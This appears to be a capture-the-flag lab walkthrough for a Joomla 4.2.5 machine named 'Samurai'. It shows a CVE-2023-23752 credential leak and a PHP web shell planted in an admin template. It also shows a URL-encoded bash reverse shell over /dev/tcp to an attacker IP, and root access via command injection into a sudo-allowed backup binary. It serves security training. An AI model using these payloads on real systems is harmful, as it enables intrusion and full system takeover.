---
source: Hack Smarter
title: Samurai
difficulty: Easy
tags: Web Exploitation, Joomla CMS, PHP, Command Injection
summary: **Samurai**: A web server running a vulnerable version of Joomla allows the attacker to retrieve sensitive information. They can use this to access the Joomla admin portal and modify the admin theme php code to gain access to the system. 
User enumeration shows sudo privileges to run a root owned SUID binary vulnerable to command injection, leading to privilege escalation.
---

## [01] Port Scan and Service Discovery

```term
$ sudo nmap -sC -sV -vv -oN scans/nmap_top1000.txt 10.1.247.101

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Samurai
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## [02] Enumerating Web Service

There are no glaring hints on the landing page, but running `ffuf` we find a few interesting directories.

```term
$ ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.1.247.101/FUZZ -ac -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.1.247.101/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

media                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 32ms]
templates               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 32ms]
!!modules                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 32ms]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 32ms]
!!plugins                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 32ms]
!!includes                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 32ms]
language                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 32ms]
components              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 32ms]
!!api                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 32ms]
cache                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 31ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 3555ms]
tmp                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 32ms]
layouts                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 32ms]
!!administrator           [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 32ms]
!!cli                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 32ms]
:: Progress: [220559/220559] :: Job [1/1] :: 1212 req/sec :: Duration: [0:03:06] :: Errors: 0 ::
```

With this many hits, I typically start with looks the most valuable amd work my way down. `/administrator` is jumping out immediately.
```term
$ curl http://10.1.247.101/administrator/                                                                                                                                                                                                                                              
---snip---
!!        <meta name="generator" content="Joomla! - Open Source Content Management">
        <title>Samurai - Administration</title>
        <link href="/media/system/images/joomla-favicon.svg" rel="icon" type="image/svg+xml">
        <link href="/media/system/images/favicon.ico" rel="alternate icon" type="image/vnd.microsoft.icon">
!!        <link href="/media/system/images/joomla-favicon-pinned.svg" rel="mask-icon" color="#000">
!!        <link href="/media/templates/administrator/atum/css/vendor/joomla-custom-elements/joomla-alert.min.css?0.2.0" rel="stylesheet" />
```

Looking at the `/administrator/` endpoint we get a few mentions of `Joomla` which is a common `Content Management System (CMS)`. There is a great article here 
`https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website` that can help us find the version of the Joomla instance. Grabbing the example URL's 
and trying them against our target yields the following: 
```term
$ curl http://10.1.247.101/administrator/manifests/files/joomla.xml

---snip---
        <version>4.2.5</version>
---snip---
```

And we get a version number, `4.2.5`. Searching for vulnerabilities on this we can stumble across `CVE-2023-23752`. Doing more research we can find the following exploit, 
`https://www.exploit-db.com/exploits/51334` for `Unauthenticated Information Disclosure`. Let's download the script and run it against our target.
```term
$ ./cve2023-23753.rb http://10.1.247.101
Users
!![769] Oda (Miyamoto) - oda@local.local - Super Users

Site info
Site name: Samurai
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: joomla425
!!DB password: xxxxxxxx 
DB name: Dbjoomla
DB prefix: iemj4_
DB encryption 0
```

We get a set of credentials we can test against the admin panel.

## [03] Shell as "www-data"

Looking through the admin portal we can find a template editor under `System > Administrator Templates > Atum Details and Files`. Most of the files are `.php`, which we can also edit. 
I chose to edit `/administrator/templates/atum/error_login.php` and put a simple `php reverse shell` payload in the content:
```term
<?php
!!system($_REQUEST['cmd']);
/**
 * @package     Joomla.Administrator
 * @subpackage  Templates.Atum
 * @copyright   (C) 2018 Open Source Matters, Inc. <https://www.joomla.org>
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 * @since       4.0.0
 */

defined('_JEXEC') or die;
---snip---
```

Now let's hit the endpoint and see if we get code execution.
```term
$ curl http://10.1.247.101/administrator/templates/atum/error_login.php\?cmd\=whoami
!!www-data
```

We have confirmed our payload is working, let's now upgrade to a `bash reverse shell` by sending another payload through the `cmd` parameter. You can use a proxy such as `BurpSuite` to 
intercept and modify the existing request, or use curl. With web requests I find `URL encoding` works much more reliably. Using `CyberChef` we can easily write our desired payload and 
have it URL encode for us. We can then start our listener and send the payload.

```term
$ curl http://10.1.247.101/administrator/templates/atum/error_login.php\?cmd\=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E200%2E68%2E254%2F9001%200%3E%261%27

!!nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.200.68.254] from (UNKNOWN) [10.1.247.101] 54988
bash: cannot set terminal process group (792): Inappropriate ioctl for device
bash: no job control in this shell
!!www-data@streetcoder:/var/www/html/administrator/templates/atum$ whoami
!!www-data
```

We now have access to the machine. Remembering from earlier, we found database credentials for the `mysql` service. We can use them to access the database running on localhost.
```term
$ www-data@streetcoder:/var/www/html/administrator/templates/atum$ mysql -h localhost -u joomla425 -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 150
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]> show databases;
!!+--------------------+
!!| Database           |
!!+--------------------+
!!| Dbjoomla           |
!!| information_schema |
!!+--------------------+
```

While there isn't anything too useful here, it's always good habit to poke around the database to see what loot we can gather.

## [04] Privilege Escalation

Enumerating our user (www-data) shows something of interest:
```term
$ www-data@streetcoder:/var/www/html/administrator/templates/atum$ sudo -l
Matching Defaults entries for www-data on streetcoder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on streetcoder:
!!    (root) NOPASSWD: /opt/backup/DbMaria
```

We can run `/opt/backup/Dbmaria` as root with no password.

```term
$ www-data@streetcoder:/var/www/html/administrator/templates/atum$ file /opt/backup/DbMaria
/opt/backup/DbMaria: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dfb0bf8319563ccca311f917b82f9ca0a051204f, for GNU/Linux 3.2.0, not stripped
```

The `file` command shows it's a compiled binary. We can use `strings` to search the binary for any human readable artifacts to get an idea of what this binary does statically.
```term
$ www-data@streetcoder:/var/www/html/administrator/templates/atum$ strings /opt/backup/DbMaria
---snip---
!!Usage: %s <database>
!!mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
---snip---
```
Looking even further we can see what the binary is actually doing under the hood with `strace`.
```term
$ www-data@streetcoder:/var/www/html/administrator/templates/atum$ strace -f -e execve /opt/backup/DbMaria test
execve("/opt/backup/DbMaria", ["/opt/backup/DbMaria", "test"], 0x7ffe1b914120 /* 17 vars */) = 0
strace: Process 1747 attached
!![pid  1747] execve("/bin/sh", ["sh", "-c", "mariadb-dump --socket=/run/mysql"...], 0x7ffee775f540 /* 17 vars */) = 0
sh: 1: cannot create /tmp/backup.sql: Permission denied
[pid  1747] +++ exited with 2 +++
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1747, si_uid=33, si_status=2, si_utime=0, si_stime=0} ---
+++ exited with 0 +++
```

So we now know this binary is intended to take user input, feed it to `mariadb-dump` and then redirect the output to `/tmp/backup.sql`. Remember we control `%s`, therefore we control the flow. We can verify with the 
following command injection:

```term
$ www-data@streetcoder:/var/www/html/administrator/templates/atum$ sudo /opt/backup/DbMaria 'test; id #'
/*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19  Distrib 10.6.23-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: test
-- ------------------------------------------------------
-- Server version       10.6.23-MariaDB-0ubuntu0.22.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
mariadb-dump: Got error: 1049: "Unknown database 'test'" when selecting the database
!!uid=0(root) gid=0(root) groups=0(root)
```
